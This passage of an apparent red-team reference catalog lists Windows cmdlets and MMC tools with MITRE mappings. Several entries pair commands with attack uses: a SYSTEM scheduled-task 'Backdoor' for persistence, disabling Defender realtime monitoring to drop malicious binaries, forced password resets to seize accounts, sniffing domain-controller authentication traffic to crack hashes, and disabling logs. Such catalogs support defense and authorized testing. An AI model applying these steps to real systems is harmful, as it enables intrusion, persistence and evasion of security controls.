"detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 310, "name": "Register-ScheduledTask", "type": "Cmdlets", "function": "Execute", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Registers a scheduled task definition on a local computer", "description": "Create new scheduled task", "commandline": "$a = New-ScheduledTaskAction -Execute \"C:\\Tmp\\backdoor.exe\" -Argument '-background'\n$p = New-ScheduledTaskPrincipal -UserId \"NT Authority\\SYSTEM\"\n$ss = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -AllowStartIfOnBatteries -Compatibility Win8\nNew-ScheduledTask -CimSession $s -Action $a -Principal $p -Settings $ss\n$t = Register-ScheduledTask -CimSession $s Backdoor -InputObject $d", "usecases": ["Persistence"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `ScheduledTasks`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 311, "name": "Remove-ADUser", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Removes an Active Directory user", "description": "TODO", "commandline": "Remove-ADUser", "usecases": [], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 312, "name": "Remove-DhcpServerv4Lease", "type": "Cmdlets", "function": "Manage", "toolsets": ["CIMSession", "TODO"], "synopsis": "Deletes the specified IPv4 address lease record from the Dynamic Host Configuration Protocol (DHCP) server service", "description": "TODO", "commandline": "Remove-DhcpServerv4Lease -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DhcpServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 313, "name": "Remove-FileShare", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Removes a file share", "description": "TODO", "commandline": "Remove-FileShare -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 314, "name": "Remove-MpPreference", "type": "Cmdlets", "function": "Misc", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Removes exclusions or default actions", "description": "TODO", "commandline": "Remove-MpPreference -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Defender`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 315, "name": "Remove-MpThreat", "type": "Cmdlets", "function": "Misc", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Removes active threats from a computer", "description": "TODO", "commandline": "Remove-MpThreat -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Defender`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 316, "name": "Remove-NetEventSession", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Removes a network event session", "description": "TODO", "commandline": "Remove-NetEventSession -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetEventPacketCapture`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 317, "name": "Remove-NetNat", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Removes NAT objects", "description": "TODO", "commandline": "Remove-NetNat -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetNat`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 318, "name": "Remove-NetNatExternalAddress", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Removes an external address from a NAT instance", "description": "TODO", "commandline": "Remove-NetNatExternalAddress -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetNat`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 319, "name": "Remove-NetNatStaticMapping", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Removes static mappings from a NAT instance", "description": "TODO", "commandline": "Remove-NetNatStaticMapping -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetNat`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 320, "name": "Remove-SmbShare", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Deletes the specified SMB shares", "description": "TODO", "commandline": "Remove-SmbShare -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `SmbShare`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 321, "name": "Remove-VirtualDisk", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Deletes an existing virtual disk and reclaims the used space for use by other virtual disks in the same storage pool", "description": "TODO", "commandline": "Remove-VirtualDisk -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 322, "name": "Rename-ADObject", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Changes the name of an Active Directory object", "description": "TODO", "commandline": "Rename-ADObject", "usecases": [], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 323, "name": "Resolve-DnsName", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin"], "synopsis": "Performs a DNS name query resolution for the specified name", "description": "Identify servers in the domain", "commandline": "Resolve-DnsName -Type SRV _kerberos._tcp.ad.bitsadmin.com", "usecases": ["Identify Kerberos Key Distribution Center service"], "comments": "Various other queries available to identify servers at the resources link\nPowerShell Module: `DnsClient`", "resources": ["https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7fcdce70-5205-44d6-9c3a-260e616a2f04"], "mitre_techniques": ["T1590.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 324, "name": "Restart-Computer", "type": "Cmdlets", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Restarts the operating system on local and remote computers", "description": "Restart machines", "commandline": "Restart-Computer -ComputerName W10.ad.bitsadmin.com,W11.ad.bitsadmin.com", "usecases": ["When persistence has been accomplished, a restart will trigger execution of the payload"], "comments": "PowerShell Module: `Microsoft.PowerShell.Management`", "resources": [], "mitre_techniques": ["T1529"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 325, "name": "Search-ADAccount", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Gets Active Directory user, computer, or service accounts", "description": "Search for accounts", "commandline": "Search-ADAccount -AccountInactive -TimeSpan 30", "usecases": ["Accounts that are inactive for at least 30 days"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 326, "name": "Set-ADAccountControl", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Modifies user account control (UAC) values for an Active Directory account", "description": "TODO", "commandline": "Set-ADAccountControl", "usecases": [], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 327, "name": "Set-ADAccountExpiration", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Sets the expiration date for an Active Directory account", "description": "TODO", "commandline": "Set-ADAccountExpiration", "usecases": [], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 328, "name": "Set-ADAccountPassword", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Modifies the password of an Active Directory account", "description": "Reset password", "commandline": "$new = ConvertTo-SecureString 'NewPassword1!' -A -F\nSet-ADAccountPassword -Identity MyAccount -Reset -NewPassword $new", "usecases": ["Force reset a user's password to obtain access to the account"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": ["T1531"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 329, "name": "Set-ADAccountPassword", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Modifies the password of an Active Directory account", "description": "Update password", "commandline": "$old = ConvertTo-SecureString 'OldPassword1!' -A -F\n$new = ConvertTo-SecureString 'NewPassword1!' -A -F\nSet-ADAccountPassword -Identity MyAccount -OldPassword $old -NewPassword $new", "usecases": ["Update a user's password"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": ["T1531"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 330, "name": "Set-ADGroup", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Modifies an Active Directory group", "description": "TODO", "commandline": "Set-ADGroup", "usecases": [], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 331, "name": "Set-ADObject", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Modifies an Active Directory object", "description": "TODO", "commandline": "Set-ADObject", "usecases": [], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 332, "name": "Set-ADServiceAccount", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Modifies an Active Directory managed service account or group managed service account object", "description": "TODO", "commandline": "Set-ADServiceAccount", "usecases": [], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 333, "name": "Set-ADUser", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Modifies an Active Directory user", "description": "TODO", "commandline": "Set-ADUser", "usecases": [], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 334, "name": "Set-CimInstance", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Modifies a CIM instance on a CIM server by calling the ModifyInstance method of the CIM class", "description": "Update attribute of CIM instance", "commandline": "Set-CimInstance -Query 'Select * from Win32_Environment where name LIKE \"testvar%\"' -Property @{VariableValue=\"abcd\"}", "usecases": ["Update path variable"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `CimCmdlets`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 335, "name": "Set-DhcpServerAuditLog", "type": "Cmdlets", "function": "Manage", "toolsets": ["CIMSession", "TODO"], "synopsis": "Sets the Dynamic Host Configuration Protocol (DHCP) server service audit log configuration on the DHCP server service running on the computer", "description": "TODO", "commandline": "Set-DhcpServerAuditLog -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DhcpServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 336, "name": "Set-MpPreference", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Configures preferences for Windows Defender scans and updates", "description": "Disable realtime monitoring", "commandline": "Set-MpPreference -CimSession $s -DisableRealtimeMonitoring $true", "usecases": ["Disable the realtime protection of Windows Defender to be able to drop malicious binaries"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNote this will shown an alert to the user, alternative is to add an excluded folder using [Add-MpPreference](../Add-MpPreference)\nPowerShell Module: `Defender`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 337, "name": "Set-NetConnectionProfile", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Changes the network category of a connection profile", "description": "Update connection profile for network adapter", "commandline": "Set-NetConnectionProfile -CimSession $s -InterfaceAlias 'Ethernet0' -NetworkCategory Private", "usecases": ["Update connection profile to have a different firewall policy applied"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetConnection`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 338, "name": "Set-NetFirewallProfile", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Configures settings that apply to the per-profile configurations of the Windows Firewall with Advanced Security", "description": "TODO", "commandline": "Set-NetFirewallProfile -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `netsecurity`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 339, "name": "Set-NetFirewallRule", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Modifies existing firewall rules", "description": "TODO", "commandline": "Set-NetFirewallRule -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `netsecurity`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 340, "name": "Set-NetFirewallSetting", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Modifies the global firewall settings of the target computer", "description": "TODO", "commandline": "Set-NetFirewallSetting -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `netsecurity`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 341, "name": "Set-NetNat", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Modifies settings for NAT objects", "description": "TODO", "commandline": "Set-NetNat -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetNat`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 342, "name": "Set-NetNatGlobal", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Modifies global settings for NAT instances on a computer", "description": "TODO", "commandline": "Set-NetNatGlobal -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetNat`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 343, "name": "Set-NetRoute", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Modifies an entry or entries in the IP routing table", "description": "TODO", "commandline": "Set-NetRoute -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetTCPIP`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 344, "name": "Set-ScheduledTask", "type": "Cmdlets", "function": "Processes", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Modifies a scheduled task", "description": "Update schedule task", "commandline": "Set-ScheduledTask -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `ScheduledTasks`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 345, "name": "Set-WSManInstance", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "TODO"], "synopsis": "Modifies the management information that is related to a resource", "description": "TODO", "commandline": "Set-WSManInstance", "usecases": [], "comments": "PowerShell Module: `Microsoft.WSMan.Management`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 346, "name": "Show-DnsServerCache", "type": "Cmdlets", "function": "Network", "toolsets": ["CIMSession", "RSAT"], "synopsis": "Shows the records in a DNS Server Cache", "description": "Show DNS server cached DNS entries", "commandline": "Show-DnsServerCache -CimSession $s", "usecases": ["Reconnaissance on the network/Internet activities on the domain"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DnsServer`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 347, "name": "Show-EventLog", "type": "Cmdlets", "function": "Logs", "toolsets": ["Builtin", "GUI"], "synopsis": "Displays the event logs of the local or a remote computer in Event Viewer", "description": "Show Windows event log", "commandline": "Show-EventLog -ComputerName W10.ad.bitsadmin.com", "usecases": ["Disable certain logs (Right click -> Disable Log)", "Identify source IPs from which certain users have logged in to chase after their workstations"], "comments": "Simply launches `mmc.exe eventvwr.msc /COMPUTER:W10.ad.bitsadmin.com`\nEquivalent to [eventvwr.msc](../../MMC/eventvwr)", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 348, "name": "Show-NetFirewallRule", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Displays all of the existing IPsec rules and associated objects in a fully expanded view", "description": "TODO", "commandline": "Show-NetFirewallRule -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `netsecurity`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 349, "name": "Start-DscConfiguration", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Applies configuration to nodes", "description": "TODO", "commandline": "Start-DscConfiguration -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `PSDesiredStateConfiguration`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 350, "name": "Start-NetEventSession", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Starts event and packet capture for a network event session", "description": "TODO", "commandline": "Start-NetEventSession -Name sess -CimSession $s", "usecases": ["Sniff authentication traffic on a domain controller and locally crack the hashes"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nSee all details in [New-NetEventSession](../New-NetEventSession)\nPowerShell Module: `NetEventPacketCapture`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 351, "name": "Start-ScheduledTask", "type": "Cmdlets", "function": "Execute", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Starts one or more instances of a scheduled task", "description": "Launch scheduled task", "commandline": "Start-ScheduledTask -CimSession $s -TaskName Backdoor", "usecases": ["Launch implant"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `ScheduledTasks`", "resources": [], "mitre_techniques": ["T1053.005", "T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 352, "name": "Start-VM", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Starts a virtual machine", "description": "Start VM", "commandline": "Start-VM -Name 'Windows 10 22H2' -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Hyper-V`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 353, "name": "Stop-Computer", "type": "Cmdlets", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Stops (shuts down) local and remote computers", "description": "Shutdown machines", "commandline": "Stop-Computer -ComputerName W10.ad.bitsadmin.com,w11.ad.bitsadmin.com -Force", "usecases": ["Make machine unavailable"], "comments": "PowerShell Module: `Microsoft.PowerShell.Management`", "resources": [], "mitre_techniques": ["T1529"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 354, "name": "Stop-EtwTraceSession", "type": "Cmdlets", "function": "Misc", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Stops the specified ETW session", "description": "TODO", "commandline": "Stop-EtwTraceSession -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `EventTracingManagement`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 355, "name": "Stop-NetEventSession", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Stops event and packet capture for a network event session", "description": "Stop packet capture", "commandline": "Stop-NetEventSession -Name sess -CimSession $s", "usecases": ["Sniff authentication traffic on a domain controller and locally crack the hashes"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nSee all details in [New-NetEventSession](../New-NetEventSession)\nPowerShell Module: `NetEventPacketCapture`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 356, "name": "Test-Connection", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "TODO"], "synopsis": "Sends ICMP echo request packets, or pings, to one or more computers.", "description": "", "commandline": "Test-Connection DC1.ad.bitsadmin.com", "usecases": [], "comments": "By default uses ICMP, however provides a number of parameters related to authentication", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 357, "name": "Test-NetConnection", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "TODO"], "synopsis": "Displays diagnostic information for a connection", "description": "TODO", "commandline": "Test-NetConnection", "usecases": [], "comments": "PowerShell Module: `NetTCPIP`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 358, "name": "Uninstall-WindowsFeature", "type": "Cmdlets", "function": "Manage", "toolsets": ["RSAT", "TODO"], "synopsis": "Uninstalls specified Windows Server roles, role services, and features from a computer that is running Windows Server 2012 R2", "description": "TODO", "commandline": "Uninstall-WindowsFeature", "usecases": [], "comments": "PowerShell Module: `ServerManager`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 359, "name": "Unlock-ADAccount", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Unlocks an Active Directory account", "description": "TODO", "commandline": "Unlock-ADAccount", "usecases": [], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 360, "name": "Unregister-ScheduledTask", "type": "Cmdlets", "function": "Execute", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Unregisters a scheduled task", "description": "Remove scheduled task", "commandline": "Unregister-ScheduledTask -CimSession $s Backdoor -Confirm:$false", "usecases": ["Remove persistence"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `ScheduledTasks`", "resources": [], "mitre_techniques": ["T1053.005", "T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 361, "name": "Write-EventLog", "type": "Cmdlets", "function": "Logs", "toolsets": ["Builtin", "TODO"], "synopsis": "Writes an event to an event log.", "description": "TODO", "commandline": "Write-EventLog", "usecases": [], "comments": "PowerShell Module: `Microsoft.PowerShell.Management`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 362, "name": "AdRmsAdmin.msc", "type": "MMC", "function": "Domain", "toolsets": ["GUI", "RSAT"], "synopsis": "Active Directory Rights Management Services", "description": "Active Directory Rights Management Services", "commandline": "AdRmsAdmin.msc", "usecases": [], "comments": "Right click -> Add Cluster -> Connect to: Remote computer", "resources": [], "mitre_techniques": [], "detections": "Port: 80/TCP\nPort: 443/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 363, "name": "CluAdmin.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "Failover Cluster Manager", "description": "Failover Cluster Manager", "commandline": "CluAdmin.msc", "usecases": [], "comments": "Right click Failover Cluster Manager -> Connect to Cluster -> Browse", "resources": [], "mitre_techniques": [], "detections": "Port: 389/UDP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 364, "name": "DevModeRunAsUserConfig.msc", "type": "MMC", "function": "Domain", "toolsets": ["Builtin", "GUI"], "synopsis": "Group policy settings: Start Menu and Taskbar", "description": "Group policy settings: Start Menu and Taskbar", "commandline": "gpedit.msc", "usecases": [], "comments": "For remote use, see [gpedit.msc](../gpedit)\nEquivalent to gpedit.msc -> User Configuration -> Administrative Templates -> Start Menu and Taskbar", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 365, "name": "Microsoft.IdentityServer.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "Server"], "synopsis": "AD FS Management", "description": "AD FS Management", "commandline": "%SystemRoot%\\ADFS\\Microsoft.IdentityServer.msc", "usecases": [], "comments": "Seems not possible to use this MMC remotely. Use the ADFS PowerShell module instead", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 366, "name": "RAMgmtUI.exe", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "Remote Access Management", "description": "Remote Access Management", "commandline": "RAMgmtUI.exe -computerName DC1.ad.bitsadmin.com", "usecases": [], "comments": "Manage DirectAccess and VPN", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP\nPort: 135/TCP\nPort: 5985/TCP\nPort: 389/UDP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 367, "name": "SQLServerManager15.msc", "type": "MMC", "function": "Manage", "toolsets": ["Extra", "GUI"], "synopsis": "SQL Server 2019 Configuration Manager", "description": "SQL Server 2019 Configuration Manager", "commandline": "SQLServerManager15.msc /computer:SQL1.ad.bitsadmin.com", "usecases": [], "comments": "Install \"Client Tools Connectivity\" in the SQL Server Express or Developer installation wizard", "resources": ["https://www.microsoft.com/en-us/evalcenter/download-sql-server-2019"], "mitre_techniques": [], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 368, "name": "SQLServerManager16.msc", "type": "MMC", "function": "Manage", "toolsets": ["Extra", "GUI"], "synopsis": "SQL Server 2022 Configuration Manager", "description": "SQL Server 2022 Configuration Manager", "commandline": "SQLServerManager16.msc 